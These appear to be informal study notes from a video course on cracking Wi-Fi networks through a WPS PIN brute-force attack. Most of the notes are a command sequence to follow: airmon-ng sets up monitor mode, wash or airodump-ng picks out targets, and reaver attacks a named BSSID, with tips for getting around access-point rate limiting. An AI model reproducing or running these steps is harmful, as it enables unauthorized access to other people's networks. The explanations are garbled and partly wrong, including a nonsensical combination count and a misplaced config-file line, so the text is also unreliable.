### BruteForce Attack
It is the trial and error method to decode the encrypted data.
In wifi hacking it uses 8 digit pin to encrypt the wifi passphrase.
wps 

braindrop creater reaver 
use first 4 digit of pin to check if it is correct or not.. then guess randomly other 4 digits. reducing time
8**10 combination : 10000

Stepwise methods
-------------
Follow the code as mention in the video step by step

> - :~# ifconfig
> - :~# airmon-ng ---> enable to monitor all traffic received from the wireless network. differet from promiscuous mode often called packet sniffing
> - :~# airmon-ng start wlan0 --->Enable monitor mode
> - :~# airmon-ng check ---> checking interfering process
> - :~# airmon-ng check kill ---> kill all the process
> - :~# filter hackable network. explaned in previos video. start with time.
> - :~# wash -i mon0 or airodump-ng wlan0mon,mon0
> - :~# reaver -i wlan0mon -b C4:E9:84:31:03:C6 -p 29650002  -S -N -vv -K 1//-s sends dh key. cracking speed. -N no nack
if problem like AP limiting found follow and delay option -p 30 / increase delay time. try testing





----------

restart the network
-------------
 - /etc/inetd.conf : Internet superserver configuration database
To restart the network.
> - :~# airmon-ng stop wlan0mon ---> disable monitor mode
> - :~# service networking restart
> - :~# service network-manager restart
